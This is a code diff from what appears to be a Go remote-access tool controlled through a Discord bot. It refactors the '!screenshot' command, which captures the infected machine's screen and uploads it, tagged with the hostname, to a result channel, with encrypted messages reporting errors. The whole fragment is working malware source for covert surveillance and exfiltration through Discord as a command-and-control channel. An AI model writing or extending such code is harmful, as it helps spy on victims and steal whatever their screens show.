@@ -3,7 +3,6 @@ package main
 import (
 	"bytes"
 	"fmt"
-	"image/png"
 	"io"
 	"log"
 	"net/http"
@@ -20,7 +19,6 @@ import (
 
 	"github.com/bwmarrin/discordgo"
 	"github.com/joho/godotenv"
-	"github.com/kbinani/screenshot"
 )
 
 var (
@@ -252,32 +250,15 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 
 	case "!screenshot":
 		log.Println("[*] Taking screenshot...")
-
-		n := screenshot.NumActiveDisplays()
-		if n <= 0 {
-			sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] No active displays found.", myHostname)), EncryptionKey)
-			return
-		}
-
-		bounds := screenshot.GetDisplayBounds(0)
-		img, err := screenshot.CaptureRect(bounds)
+		imgBytes, err := platform.Screenshot()
 		if err != nil {
 			log.Printf("Error capturing screen: %v", err)
 			sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Error capturing screen: %v", myHostname, err)), EncryptionKey)
 			return
 		}
 
-		var buf bytes.Buffer
-		err = png.Encode(&buf, img)
-		if err != nil {
-			log.Printf("Error encoding PNG: %v", err)
-			sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Error encoding screenshot: %v", myHostname, err)), EncryptionKey)
-			return
-		}
-
 		fileName := fmt.Sprintf("screenshot_%s.png", myHostname)
-
-		_, err = s.ChannelFileSend(ResultChannel, fileName, &buf)
+		_, err = s.ChannelFileSend(ResultChannel, fileName, bytes.NewReader(imgBytes))
 		if err != nil {
 			log.Printf("Error sending screenshot: %v", err)
 		}
